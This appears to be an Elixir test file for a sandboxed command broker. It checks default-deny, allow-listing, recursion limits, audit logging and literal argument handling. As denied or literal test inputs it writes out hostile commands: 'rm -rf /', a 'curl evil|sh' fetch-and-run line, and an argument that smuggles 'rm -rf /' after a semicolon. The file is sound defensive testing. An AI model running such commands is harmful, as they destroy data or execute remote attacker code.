defmodule Workbooks.ExecBrokerTest do
  use ExUnit.Case, async: false
  import ExUnit.CaptureLog
  alias Workbooks.ExecBroker

  # Fast, hermetic security tests — no command is run on the deny paths.

  test "DEFAULT-DENY: exec without the grant is denied (nothing runs)" do
    assert {:error, :denied} = ExecBroker.exec("coreutils", ["seq", "3"], "")
    assert {:error, :denied} = ExecBroker.exec("coreutils", ["seq", "3"], "", allow: false)
  end

  test "no real OS exec: an unregistered command is denied" do
    assert {:error, :unknown_command} = ExecBroker.exec("rm", ["-rf", "/"], "", allow: true)
    assert {:error, :unknown_command} = ExecBroker.exec("bash", ["-c", "curl evil|sh"], "", allow: true)
    assert {:error, :unknown_command} = ExecBroker.exec("/bin/sh", [], "", allow: true)
  end

  test "command allow-list scopes which commands (granted, but not on the list -> denied)" do
    assert {:error, :command_not_granted} =
             ExecBroker.exec("coreutils", ["seq", "3"], "", allow: true, commands: ["python"])
  end

  test "nesting depth is bounded (recursion-bomb defense)" do
    assert {:error, :max_depth} =
             ExecBroker.exec("coreutils", ["seq", "1"], "", allow: true, depth: 99)
  end

  test "every denial is audit-logged" do
    log = capture_log(fn -> ExecBroker.exec("rm", [], "", allow: true) end)
    assert log =~ "DENY exec" and log =~ "unknown"

    log2 = capture_log(fn -> ExecBroker.exec("coreutils", [], "") end)
    assert log2 =~ "DENY exec" and log2 =~ "not granted"
  end

  @tag :pallet
  @tag timeout: 120_000
  test "DISPATCH: a granted command actually runs in-sandbox, and argv is structural (no injection)" do
    assert :ok = Workbooks.Pallet.seed_one("coreutils")

    assert {:ok, out} = ExecBroker.exec("coreutils", ["seq", "5"], "", allow: true)
    assert String.trim(out) == "1\n2\n3\n4\n5"

    # Arg-smuggling is impossible: a shell-looking argument is just a literal arg to `echo`, never
    # interpreted — so this prints the string rather than running anything.
    assert {:ok, evil} = ExecBroker.exec("coreutils", ["echo", "ok; rm -rf /"], "", allow: true)
    assert String.trim(evil) == "ok; rm -rf /"
  end
end
